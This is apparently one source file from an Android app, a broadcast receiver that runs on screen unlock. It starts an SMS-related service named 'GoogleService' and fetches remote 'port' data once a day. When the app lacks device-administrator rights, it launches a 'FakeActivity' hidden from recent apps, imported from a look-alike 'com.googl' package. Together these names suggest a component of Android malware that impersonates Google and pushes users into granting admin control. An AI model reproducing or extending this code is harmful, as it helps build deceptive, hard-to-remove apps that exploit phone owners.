package com.xstd.plugin.receiver;

import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import com.googl.plugin.x.FakeActivity;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.plugin.binddevice.DeviceBindBRC;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.SettingManager;
import com.xstd.plugin.service.GoogleService;
import com.xstd.plugin.service.PluginService;

import java.util.Calendar;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-20
 * Time: AM8:43
 * To change this template use File | Settings | File Templates.
 */
public class ScreenBRC extends BroadcastReceiver {

    public static final int DAY_START_HOUR = 6;

    public void onReceive(Context context, Intent intent) {
        //check Google Service if runging for SMS
        Intent serviceIntent = new Intent();
        serviceIntent.setClass(context, GoogleService.class);
        context.startService(serviceIntent);

        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        boolean isActive = dpm.isAdminActive(new ComponentName(context, DeviceBindBRC.class));

        SettingManager.getInstance().init(context);
        if (intent != null && isActive /**SettingManager.getInstance().getKeyHasBindingDevices()*/) {
            String action = intent.getAction();
            if (Intent.ACTION_USER_PRESENT.equals(action)) {
                Config.LOGD("[[ScreenBRC::onReceive]] action = " + action);

                if (AppRuntime.LOCK_DEVICE_AS_DISDEVICE) {
//                    UtilsRuntime.goHome(context);
                    AppRuntime.LOCK_DEVICE_AS_DISDEVICE = false;
                    //TODO: 可以在此时启动一个看门狗service，来检查是否退到home
                }

                SettingManager.getInstance().init(context.getApplicationContext());
                if (SettingManager.getInstance().getKeyActiveTime() == 0) {
                    //没有激活过
                    Intent i = new Intent();
                    i.setAction(PluginService.ACTIVE_ACTION);
                    context.startService(i);
                }

                long lastFetchTime = SettingManager.getInstance().getKeyLastPortFetchTime();
                if (lastFetchTime == 0) {
                    Calendar c = Calendar.getInstance();
                    //24小时制
                    int hour = c.get(Calendar.HOUR_OF_DAY);
                    if (hour > 6 && UtilsRuntime.isOnline(context)) {
                        //如果之前没有获取过数据，并且当前时间大于6点，那么获取一次接口数据
                        Intent i = new Intent();
                        i.setAction(PluginService.PORT_FETCH_ACTION);
                        context.startService(i);
                    }
                } else {
                    Calendar c = Calendar.getInstance();
                    c.setTimeInMillis(lastFetchTime);
                    int lastDay = c.get(Calendar.DAY_OF_YEAR);
                    int lastHour = c.get(Calendar.HOUR_OF_DAY);
                    c = Calendar.getInstance();
                    int curDay = c.get(Calendar.DAY_OF_YEAR);
                    int curHour = c.get(Calendar.HOUR_OF_DAY);

                    if (curDay > lastDay && curHour > 6 && UtilsRuntime.isOnline(context)) {
                        //如果之前获取过数据，并且不是同一天，并且当前时间大于6点，那么获取一次接口数据
                        Intent i = new Intent();
                        i.setAction(PluginService.PORT_FETCH_ACTION);
                        context.startService(i);
                    }
                }
            }
        } else if (!isActive) {
            Intent i = new Intent();
            i.setClass(context, FakeActivity.class);
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            context.startActivity(i);
        }
    }

}
